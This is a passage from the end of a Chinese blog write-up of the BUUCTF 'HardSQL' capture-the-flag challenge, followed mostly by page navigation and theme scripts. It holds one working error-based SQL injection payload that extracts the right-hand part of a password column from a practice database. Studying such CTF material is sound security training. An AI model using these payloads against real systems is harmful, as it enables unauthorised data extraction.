+<p>注意：当有且仅有一个表叫H4rDsq1时，geek.H4rDsq1与H4rDsq1是等价的，geek.H4rDsq1只是指定了数据库geek。</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165536158.png" alt="image-20231113165536158"></p>
+<p><strong>获取后（右）30个字符</strong></p>
+<p>Payload：?username=1’^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23&amp;password=123456</p>
+<p><img src="/2023/11/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SQl%E6%B3%A8%E5%85%A5/image-20231113165547343.png" alt="image-20231113165547343"></p>
+<p>根据从左和从右获取的flag，拼接成完整的flag即可；注意有重叠的地方要删除。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/" rel="tag"># 靶场训练</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/17/WPS-Office%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88QVD-2023-17241%EF%BC%89/" rel="prev" title="WPS-Office代码执行漏洞（QVD-2023-17241）">
+      <i class="fa fa-chevron-left"></i> WPS-Office代码执行漏洞（QVD-2023-17241）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5-BUUCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">SQL注入|BUUCTF SQL注入题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL-1"><span class="nav-number">1.1.</span> <span class="nav-text">[极客大挑战 2019]EasySQL 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">1.2.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="nav-number">1.3.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="nav-number">1.4.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="nav-number">1.5.</span> <span class="nav-text">[极客大挑战 2019]HardSQL</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">北极星上的稻草人</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">北极星上的稻草人</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<!-- 页面动态背景 -->
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
